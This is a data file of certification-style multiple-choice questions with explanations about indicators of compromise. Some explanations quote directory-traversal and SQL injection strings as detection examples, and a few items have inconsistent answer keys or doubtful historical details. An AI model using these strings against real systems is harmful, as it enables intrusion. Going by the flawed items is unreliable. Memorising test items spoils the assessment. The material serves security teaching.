# Domain 2.0 - Threats, Vulnerabilities, and Mitigations
# Subdomain 2.4 - Indicators of Malicious Activity
# Format: question|answer_a|answer_b|answer_c|answer_d|correct_idx|explanation|domain|subdomain

Which indicator might suggest a system is compromised?|Regular updates installed|Unusual outbound network traffic|Normal CPU usage|Scheduled backups completing|1|Unusual outbound network traffic, especially to unknown or suspicious destinations, can indicate compromise as malware often communicates with command and control servers or exfiltrates data. Regular updates, normal CPU usage, and successful backups are positive indicators.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What attack exploits the Address Resolution Protocol to associate an attacker's MAC address with another device's IP?|DNS poisoning|ARP poisoning|IP spoofing|MAC spoofing|1|ARP poisoning (ARP spoofing) exploits the Address Resolution Protocol to associate the attacker's MAC address with another device's IP address, redirecting traffic to the attacker. DNS poisoning targets name resolution, IP spoofing falsifies source IPs, and MAC spoofing changes MAC addresses.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Which malware changes its code structure with each iteration to avoid detection?|Static malware|Polymorphic malware|Metamorphic malware|Encrypted malware|1|Polymorphic malware changes its code structure, appearance, or encryption with each iteration while maintaining the same core functionality, making signature-based detection difficult. Static malware doesn't change, metamorphic completely rewrites itself, and encrypted malware may use consistent encryption.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What type of malware remains memory-resident without writing files to disk?|Bloatware|Fileless malware|Logic bomb|Spyware|1|Fileless malware operates entirely in memory without writing traditional executable files to disk, making it extremely difficult to detect with conventional antivirus solutions. It leverages legitimate system tools like PowerShell, WMI, or Windows Management Instrumentation to execute malicious activities directly from RAM. Fileless attacks often exploit scripting languages and built-in operating system utilities, leaving minimal forensic evidence. They bypass file-based security controls and can persist through registry modifications or scheduled tasks rather than disk-based files. Common examples include PowerShell-based attacks, reflective DLL injection, and memory-only payloads. Bloatware is pre-installed unnecessary software, logic bombs activate on specific conditions, and spyware focuses on information theft rather than memory-only operation.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Pre-installed unnecessary software that consumes system resources on new devices is called what?|Adware|Bloatware|Spyware|Rootkit|1|Bloatware refers to pre-installed software on new devices that users didn't request and often don't need, consuming valuable system resources like CPU, memory, and storage. Manufacturers and vendors include bloatware for promotional purposes or revenue-sharing agreements, but it degrades device performance and startup times. Examples include trial versions of antivirus software, manufacturer utilities, browser toolbars, and promotional games. Bloatware can pose security risks if outdated and unpatched, create attack surface, and consume bandwidth with unwanted updates. Removal requires manual uninstallation or clean OS reinstallation. Adware displays advertisements, spyware steals information, and rootkits hide malicious activity rather than simply consuming resources.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Malicious code that activates only when specific conditions are met (like a date or event) is called what?|Time bomb|Logic bomb|Trojan|Backdoor|1|A logic bomb is malicious code embedded within legitimate software that remains dormant until specific conditions are met, such as a particular date (time bomb variant), deletion of a file, or removal of a user account. When triggered, logic bombs can delete critical files, corrupt databases, disable systems, or exfiltrate data. They're often planted by disgruntled insiders with programming access, making insider threat programs crucial for prevention. Famous examples include the 2006 UBS logic bomb that deleted 2,000 servers and the 2002 Fannie Mae case where a developer programmed a logic bomb to trigger after termination. Detection requires rigorous code reviews, access controls, separation of duties, and monitoring for unauthorized code changes. Time bombs are logic bombs triggered by dates/times specifically.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Multiple failed login attempts followed by account lockouts primarily indicate what type of attack?|SQL injection|Brute force attack|XSS attack|DNS poisoning|1|Multiple failed login attempts resulting in account lockouts are classic indicators of brute force attacks, where attackers systematically try numerous password combinations to gain unauthorized access. Modern variants include password spraying (trying common passwords across many accounts) and credential stuffing (using breached username-password pairs from other sites). Account lockout policies are primary defenses, typically locking accounts after 3-5 failed attempts for 15-30 minutes. However, attackers may intentionally trigger lockouts as denial-of-service against legitimate users. Indicators include: failed login attempts during non-business hours, attempts from unusual geographic locations, rapid sequential failures across multiple accounts, and attempts using default or common passwords. Multi-factor authentication (MFA) is the most effective countermeasure.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A user's account shows logins from New York and Tokyo within 10 minutes. What indicator is this?|Session hijacking|Impossible travel|Concurrent sessions|Privilege escalation|1|Impossible travel occurs when a user account shows authentication from geographically distant locations within a timeframe that makes physical travel impossible (e.g., New York and Tokyo 10 minutes apart requires faster-than-airplane travel). This strongly indicates credential compromise, with possible causes including: stolen credentials used by multiple attackers, credential stuffing from breached databases, shared account abuse, or sophisticated attackers using VPNs/proxies to mask their true location. Organizations should: immediately suspend the account, force password reset, review account activity for unauthorized actions, check for data exfiltration, investigate how credentials were compromised, and implement geolocation-based conditional access policies. Modern identity providers like Azure AD automatically detect and alert on impossible travel. This differs from concurrent sessions (legitimate simultaneous logins) and session hijacking (taking over active session).|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

What type of attack uses a network of compromised computers to overwhelm a target?|Botnet|DDoS|Amplification|Reflection|1|A botnet is a network of compromised computers (zombies or bots) under centralized control, typically used to launch Distributed Denial of Service (DDoS) attacks by overwhelming targets with traffic from thousands or millions of infected devices. Botnets are created through malware infections via phishing, drive-by downloads, or exploiting vulnerabilities. Famous botnets include Mirai (2016, 600K IoT devices, 1Tbps attack), Emotet (banking trojan turned botnet), and ZeroAccess (cryptocurrency mining). Attackers rent botnet services on dark web for $5-50/hour. Botnets are also used for spam campaigns, credential stuffing, cryptocurrency mining, and click fraud. Detection involves monitoring for: unusual outbound traffic patterns, connections to known C2 servers, abnormal resource consumption, and behavioral anomalies. While DDoS is what botnets commonly do, the botnet itself is the infrastructure of compromised devices.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Regular communication from an internal system to an external server at fixed intervals indicates what?|Beaconing|Port scanning|ARP poisoning|SQL injection|0|Beaconing is periodic communication from a compromised system to an external command-and-control (C2) server, occurring at regular intervals (e.g., every 60 seconds, every 10 minutes) to check for new instructions, report status, or exfiltrate data. This behavior is characteristic of advanced persistent threats (APTs) and modern malware that maintains persistent access. Beaconing patterns to detect include: consistent time intervals between connections, communications to unusual domains or IPs, connections to newly registered domains, HTTPS connections to non-standard ports, and DNS queries with suspiciously long or encoded subdomains (DNS tunneling). Network monitoring tools like SIEM, NetFlow analysis, and behavioral analytics can identify beaconing by analyzing connection frequency, duration, and data volumes. Attackers use jitter (randomized intervals) and domain generation algorithms (DGAs) to evade detection. Blocking at firewall/proxy based on threat intelligence feeds is crucial.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Missing or deleted log files most likely indicate what?|System maintenance|Log rotation|Attacker covering tracks|Disk space cleanup|2|Missing or deleted log files are strong indicators that an attacker is covering their tracks after compromising a system. Attackers routinely delete or modify logs to remove evidence of: initial access methods, privilege escalation activities, lateral movement, data exfiltration, malware installation, and reconnaissance activities. Sophisticated attackers may selectively edit logs rather than deleting them entirely to avoid detection. The 2013 Target breach involved attackers deleting logs to hide 40GB of stolen credit card data. Defenses include: centralized log forwarding to SIEM (logs off the compromised system immediately), write-once storage or append-only log servers, log integrity monitoring with cryptographic hashing, alerting on logging service failures or suspicious gaps, and offline/cloud backup of critical logs. Windows Event Logs, syslog, application logs, and security tool logs are common targets. Legitimate log rotation is scheduled and documented, not sudden deletions.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Sudden spikes in network bandwidth usage during off-hours most likely indicate what?|Backup operations|System updates|Data exfiltration|User downloads|2|Sudden spikes in network bandwidth usage during non-business hours strongly suggest data exfiltration, where attackers transfer stolen data (intellectual property, customer data, financial records) to external systems. Attackers often operate during off-hours when: security teams are less vigilant, anomalous traffic is less likely to be noticed among normal business activity, network bandwidth is more available, and SIEM alert fatigue is lower. The 2021 Colonial Pipeline ransomware attack involved 100GB of data exfiltration before encryption. Indicators include: large outbound transfers to unknown destinations, unusual protocols or ports, connections to file-sharing services or cloud storage, DNS tunneling for covert channels, and compressed or encrypted traffic to evade DLP. Organizations should: baseline normal traffic patterns, implement egress filtering, monitor for large file transfers, use DLP solutions to detect sensitive data in transit, and alert on bandwidth anomalies. Legitimate backup operations and updates are scheduled and documented.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A system repeatedly tries to access blocked websites or IP addresses. What does this indicate?|User error|Malware C2 communication|Software updates|DNS issues|1|Repeated attempts to access blocked websites or IP addresses often indicate malware attempting to communicate with command-and-control (C2) servers for instructions, updates, or data exfiltration. When initial C2 infrastructure is blocked (by firewalls, DNS filtering, or threat intelligence feeds), malware may cycle through backup C2 servers, use domain generation algorithms (DGAs) to create hundreds of potential domains, or attempt to tunnel through allowed protocols. Indicators include: connections to newly registered domains (often registered hours before use), attempts to reach domains with random-looking names (DGA patterns like "xjkf23klsdf.com"), HTTPS to unusual ports (8443, 4443), and failed DNS lookups for suspicious domains. The 2016 Mirai botnet used 1,000+ C2 domains. Organizations should: investigate the source system immediately, isolate it from the network, analyze running processes and network connections, check for persistence mechanisms (scheduled tasks, registry run keys), and perform forensic analysis to identify the malware family.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Antivirus software is disabled and cannot be re-enabled. What is the most likely cause?|Software conflict|Malware interference|License expiration|Corrupted installation|1|When antivirus software is disabled and cannot be re-enabled, the most likely cause is malware designed to neutralize security controls. Sophisticated malware families like Emotet, TrickBot, and ransomware variants specifically target antivirus processes by: killing AV processes, deleting AV files, modifying Windows registry to prevent AV startup, blocking access to security websites (av-update servers), exploiting vulnerabilities in AV software itself, and running with elevated privileges to override security settings. This is a critical indicator of compromise requiring immediate response: isolate the affected system from the network, boot into safe mode or use bootable antivirus tools (not relying on the compromised OS), perform offline malware scan, check for rootkits and kernel-mode malware, investigate how the malware gained administrative privileges, and reimage the system if rootkit/bootkit suspected. Organizations should implement: tamper protection features (Windows Defender Tamper Protection), application control policies (AppLocker), and EDR solutions that are harder to disable than traditional AV.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Users report sudden appearance of browser toolbars and pop-up advertisements. What is this?|Phishing|Adware|Ransomware|Rootkit|1|Adware is software that automatically displays or downloads advertising material (pop-ups, banners, toolbars) when a user is online. While often considered low-severity compared to other malware, adware can: degrade system performance, track browsing habits and personal information, redirect web searches to advertising sites, bundle with potentially unwanted programs (PUPs), and sometimes deliver more dangerous malware. Adware typically infects systems through: bundled software installations (users skip reading install prompts), malicious browser extensions, fake software updates, and drive-by downloads from compromised websites. The 2015 Superfish adware on Lenovo laptops intercepted HTTPS connections, creating massive security vulnerabilities. Removal requires: identifying and uninstalling suspicious programs, removing browser extensions, resetting browser settings, scanning with anti-malware tools, and checking for persistence mechanisms in startup programs and scheduled tasks. Prevention includes: downloading software only from official sources, reading installation prompts carefully, and using ad-blockers and script-blockers.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

New user accounts that nobody authorized appearing in Active Directory indicate what?|HR oversight|Persistence mechanism|License upgrade|Automated provisioning error|1|Unauthorized new user accounts in Active Directory are strong indicators of attacker persistence mechanisms, created to maintain long-term access even if the initial compromise is discovered. These accounts often have: administrative privileges for lateral movement and domain dominance, names designed to blend in (similar to legitimate service accounts like "sqlbackup" or "svc_monitoring"), passwords that don't expire, and group memberships that grant extensive access. The 2020 SolarWinds attack involved creating fake user accounts to blend with legitimate accounts. Attackers may also: create hidden accounts (prefixed with $ or special characters), add accounts to privileged groups (Domain Admins, Enterprise Admins), create accounts on local systems, and establish remote access capabilities. Detection strategies include: regular audits of user accounts (especially administrative), monitoring account creation events (Windows Event ID 4720), comparing current accounts against baseline/asset inventory, checking for accounts created during known compromise timeframes, and investigating accounts with suspicious naming patterns or creation dates. Automated identity governance helps prevent unauthorized account proliferation.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Memory usage steadily increasing without corresponding application activity suggests what?|Memory leak|Normal operation|Software update|User downloads|0|A memory leak occurs when a program allocates memory but fails to release it after use, causing memory consumption to steadily increase over time until the system runs out of RAM. While memory leaks are often programming bugs rather than intentional attacks, they can: degrade system performance progressively, cause applications to crash, trigger system instability, and create denial-of-service conditions. Memory leaks can be exploited maliciously as DoS attacks or may indicate: poorly written malware consuming resources, cryptocurrency mining malware, or memory-resident malware expanding its footprint. Signs include: increasing RAM usage without corresponding CPU or disk activity, system slowdown over hours or days, applications becoming unresponsive, and improvement only after restart. The Boeing 787 Dreamliner required rebooting every 248 days due to a memory counter overflow. Languages with manual memory management (C, C++) are more prone to leaks than garbage-collected languages (Java, Python, C#). Detection uses memory profilers and monitoring tools. Mitigation involves: identifying the leaking process, updating or restarting it, applying patches, and implementing RAII (Resource Acquisition Is Initialization) programming patterns.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Certificates being installed from untrusted Certificate Authorities indicates what?|Software updates|Man-in-the-middle attack|Normal IT operations|Browser update|1|Unexpected certificates from untrusted Certificate Authorities (CAs) strongly indicate man-in-the-middle (MitM) attacks, where attackers intercept encrypted HTTPS traffic by installing malicious root certificates that allow them to decrypt, inspect, and re-encrypt communications. This technique enables attackers to: steal credentials from "secure" websites, capture sensitive data from encrypted sessions, bypass SSL/TLS protections, inject malicious content into HTTPS traffic, and monitor all encrypted communications transparently. Common scenarios include: corporate SSL inspection tools (legitimate but should be known), malware installing rogue root CAs, compromised proxy servers, public WiFi captive portals, and state-sponsored surveillance. The 2011 DigiNotar breach resulted in fraudulent certificates used for surveillance in Iran. Users should: investigate unexpected certificate warnings, check installed root CAs (Windows certmgr.msc, Mac Keychain, Linux ca-certificates), remove unauthorized certificates, scan for malware, and avoid untrusted networks. Organizations should use certificate pinning, HSTS, and monitor certificate installation events.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Processes running under unusual user accounts (SYSTEM, Administrator) that normally wouldn't indicates what?|Privilege escalation|Scheduled task|System update|Backup operation|0|Processes running under highly privileged accounts (SYSTEM, Administrator, root) that don't normally require those privileges indicate privilege escalation, where attackers elevate their access from standard user to administrative rights. This is often a critical step in attack chains after initial compromise, enabling attackers to: install rootkits and kernel-mode malware, disable security software, create persistent backdoors, access all user data, modify system configurations, and move laterally to other systems. Common privilege escalation techniques include: exploiting unpatched vulnerabilities (Windows Print Spooler, Dirty COW on Linux), abusing misconfigured services running as SYSTEM, exploiting weak file permissions, DLL hijacking, token manipulation, and kernel exploits. Indicators include: unexpected processes running as SYSTEM or administrator, unusual child processes spawned by system processes, legitimate programs exhibiting unusual behavior with elevated privileges, and processes accessing resources they shouldn't need. Detection uses EDR tools, process monitoring, and behavioral analytics. Organizations should implement: least privilege principles, patch management, and application control.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Scheduled tasks created at unusual times or with suspicious names indicate what?|System maintenance|Persistence mechanism|Backup configuration|Software update|1|Suspicious scheduled tasks are common persistence mechanisms used by attackers to maintain access after compromise, automatically re-executing malware after reboots or at specified intervals. Windows Task Scheduler and Linux cron jobs are frequently abused because they: execute with specified privileges (often SYSTEM), run without user interaction, survive reboots, are legitimate OS features (appear less suspicious), and can trigger based on various conditions (time, user login, system boot). Indicators of malicious scheduled tasks include: creation times during known compromise periods, tasks running PowerShell or cmd.exe with obfuscated commands, tasks with misleading names (misspellings like "Micorsoft" or "Windwos"), tasks pointing to unusual file locations (%TEMP%, %APPDATA%, user directories), and tasks running under privileged accounts created by non-administrators. The Emotet malware extensively uses scheduled tasks for persistence. Investigation involves: reviewing all scheduled tasks (Windows Task Scheduler, Linux crontab), checking task creation timestamps, analyzing command lines and arguments, verifying digital signatures of executables, and correlating with other IOCs. Remove unauthorized tasks and investigate the source.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A web server shows hundreds of 404 errors for paths like ../../etc/passwd. What attack is occurring?|SQL injection|Directory traversal|XSS|DDoS|1|Web server logs showing 404 errors for paths containing "../.." (dot-dot-slash) sequences accessing files like /etc/passwd, /windows/system32/config/sam, or /etc/shadow indicate directory traversal (path traversal) attacks. Attackers use these sequences to navigate outside the web root directory to access sensitive files, aiming to: read password files, access configuration files, view application source code, download database files, and identify system information. The "../" sequence moves up one directory level, so "../../../../etc/passwd" attempts to traverse up four levels then access the password file. Variations include: URL encoding (%2e%2e%2f), double encoding (%252e%252e%252f), Unicode encoding, and using backslashes on Windows (..\..\). While these 404 errors indicate unsuccessful attempts (web server blocked access), they're reconnaissance for vulnerabilities. Successful directory traversal results in 200 OK responses. Defenses include: input validation rejecting "../" patterns, chroot jails restricting file system access, principle of least privilege for web server processes, and web application firewalls (WAFs). Monitor for these patterns and investigate the source IPs.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Database logs showing queries with UNION SELECT and OR 1=1 statements indicate what?|Normal queries|SQL injection attack|Database optimization|Backup operation|1|Database logs containing queries with "UNION SELECT," "OR 1=1," "' OR '1'='1," or other suspicious SQL syntax are clear indicators of SQL injection attacks. Attackers inject malicious SQL code into application inputs to: extract sensitive data (usernames, passwords, credit cards, personal information), bypass authentication ("admin' OR '1'='1' --" to login without password), modify database contents, delete tables, and execute operating system commands on the database server. The UNION SELECT operator allows attackers to combine results from multiple queries, extracting data from tables they shouldn't access. The "1=1" condition is always true, bypassing WHERE clauses. Famous examples include the 2008 Heartland Payment Systems breach (130 million credit cards) and countless website defacements. Detection involves: reviewing database logs for suspicious patterns, monitoring error messages revealing database structure, analyzing abnormally long queries, checking for SQL keywords in input fields, and using database activity monitoring (DAM). Prevention requires: parameterized queries/prepared statements, input validation, least privilege database accounts, web application firewalls, and regular security testing.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Firewall logs showing outbound connections on ports 4444, 5555, or other unusual high ports indicate what?|Web browsing|Reverse shell|Email traffic|File transfer|1|Firewall logs showing outbound connections to unusual high-numbered ports (commonly 4444, 5555, 1337, 31337, 8888) often indicate reverse shell or backdoor communications. Unlike normal client-server models where clients initiate connections to well-known ports (80, 443, 25), reverse shells have the compromised internal system initiate outbound connections to attacker-controlled servers, bypassing ingress firewall rules that block inbound connections. Penetration testing tools like Metasploit use 4444 as the default port for reverse shells. Indicators include: connections to unusual destination IPs (residential ISPs, suspicious geolocations, newly registered domains), persistent connections maintained for long durations, data transfer patterns inconsistent with the port number, and connections originating from server systems that shouldn't initiate outbound connections. Attackers choose high ports because: they're less commonly filtered than privileged ports (0-1023), they avoid conflicting with legitimate services, and they're sometimes overlooked in firewall configurations. Organizations should: implement egress filtering, monitor outbound connections, block unnecessary outbound ports by default (whitelist approach), and investigate any unusual outbound traffic.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Registry modifications creating new Run keys or modifying service configurations indicate what?|Software installation|Persistence mechanism|System update|User preference|1|Windows Registry modifications creating or modifying Run keys and service configurations are classic persistence mechanisms allowing malware to automatically execute after system reboots. Critical registry locations for persistence include: HKLM\Software\Microsoft\Windows\CurrentVersion\Run (all users), HKCU\Software\Microsoft\Windows\CurrentVersion\Run (current user), HKLM\System\CurrentControlSet\Services (services), Winlogon keys (execute during login), and AppInit_DLLs (load into every process). These registry locations are so commonly abused that they're checked in every malware analysis. The registry offers attackers: automatic execution without user interaction, survival across reboots, ability to run with elevated privileges (SYSTEM), and appearance as legitimate system configuration. Detection involves: monitoring registry modification events (Sysmon Event ID 13), comparing current registry state against known-good baseline, checking autoruns (Sysinternals Autoruns tool), and investigating registry changes during known compromise timeframes. Legitimate software installations also modify registry, but malicious entries often have: suspicious file paths (%TEMP%, %APPDATA%), obfuscated commands, unsigned executables, or creation timestamps inconsistent with software installation. Organizations should implement registry monitoring and integrity checking.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Users receiving password reset emails they didn't request indicates what?|Phishing campaign|Account takeover attempt|System glitch|Marketing email|1|Users receiving unsolicited password reset emails strongly indicate account takeover attempts, where attackers who have obtained usernames (often through data breaches, OSINT, or email enumeration) attempt to reset passwords to gain access. This reconnaissance technique helps attackers: identify valid usernames (password reset forms often confirm if account exists), test account security (MFA enabled accounts are harder targets), prepare for targeted attacks, and potentially exploit weak password reset processes. The password reset emails themselves may be legitimate (from the actual service) or phishing emails designed to steal credentials. If legitimate, attackers are using the real password reset function; if phishing, attackers are impersonating the service to capture credentials. Users should: never click links in unsolicited password reset emails, navigate directly to the website instead, check for account access attempts in security logs, enable MFA immediately, review account recovery options (backup emails, phone numbers) for unauthorized changes, and report to IT security. Organizations should: monitor for spikes in password reset requests, implement CAPTCHA on reset forms, rate-limit reset attempts, and notify users through multiple channels for critical account changes.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

DNS queries with unusually long subdomains (50+ characters) or encoded data indicate what?|Normal DNS|DNS tunneling|DNS failure|DNSSEC|1|DNS queries with unusually long or encoded subdomains (e.g., "6d61bc704f.4a6c7de83b.2f8e9a1d5c.malicious-domain.com") indicate DNS tunneling, a covert channel technique for data exfiltration or C2 communication. DNS is often overlooked because it's essential for network operation, rarely filtered, and typically allowed through firewalls. Attackers encode data (stolen files, commands, encrypted communications) into DNS query subdomain labels, and the attacker-controlled authoritative DNS server extracts and reassembles the data. DNS tunneling tools include Iodine, DNSCat2, and commercial implants. Indicators include: DNS queries with unusually high entropy (random-looking subdomains), queries to suspicious or newly registered domains, unusual query types (TXT, NULL, CNAME), high volume of DNS queries from a single host, queries containing base64 or hex-encoded data, and queries significantly longer than typical DNS queries (legitimate average ~20 characters). The 2013 APT group Turla used DNS tunneling for C2. Defenses include: monitoring DNS query lengths and patterns, implementing DNS security tools, blocking known DNS tunneling domains, and using threat intelligence feeds. DNS should be centralized through controlled resolvers, not allowed directly outbound.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

PowerShell executing with encoded commands (EncodedCommand parameter) indicates what?|Normal administration|Obfuscated malicious script|Software deployment|System diagnostics|1|PowerShell executing with the -EncodedCommand (or -enc) parameter, especially with long base64-encoded strings, is a strong indicator of obfuscated malicious scripts attempting to evade detection. Attackers use encoded commands to: hide malicious intent from security tools, bypass command-line monitoring, evade signature-based detection, and execute complex scripts from single command lines. Base64 encoding converts readable PowerShell scripts into non-human-readable strings that decode and execute in memory. Fileless malware families like Emotet, TrickBot, and many ransomware variants extensively use encoded PowerShell. Indicators include: PowerShell launched by unusual parent processes (Office applications, browser plugins, scheduled tasks), commands with long base64 strings, network connections from PowerShell processes, and PowerShell downloading files from Internet. Organizations should: enable PowerShell script block logging (Event ID 4104 captures decoded commands), implement PowerShell Constrained Language Mode, use AppLocker or Windows Defender Application Control to restrict PowerShell execution, monitor for suspicious PowerShell process creation, and maintain PowerShell version 5+ with enhanced logging. While legitimate administrators occasionally use encoded commands, in malware context it's highly suspicious.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A system clock repeatedly being reset or showing incorrect time indicates what?|Hardware failure|Anti-forensics technique|Time zone issue|BIOS battery|1|Repeated system clock resets or incorrect time settings can indicate anti-forensics techniques used by attackers to: disrupt log timestamps and forensic timelines, invalidate digital certificates (MitM attacks), bypass time-based license checks, evade time-based security controls (scheduled scans, updates), and confuse incident response investigations. Accurate timestamps are crucial for: correlating events across systems, establishing attack timelines, forensic analysis, legal proceedings, and compliance requirements. Malware like Emotet and ransomware variants modify system time to: make logs appear from different time periods, create gaps in monitoring, prevent time-based detection signatures from matching, and disrupt NTP synchronization. However, clock issues can also indicate: dying CMOS battery, malware, GPS jamming affecting time sources, or NTP server problems. Investigation should: check system time against known-good sources, review time change events (Windows Event ID 1), examine processes with SeSystemTimePrivilege, verify NTP configuration, and correlate with other indicators of compromise. Organizations should: synchronize all systems with trusted NTP sources, monitor for time changes, restrict privileges to change system time, and use hardware security modules (HSMs) with tamper-evident clocks for critical systems.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

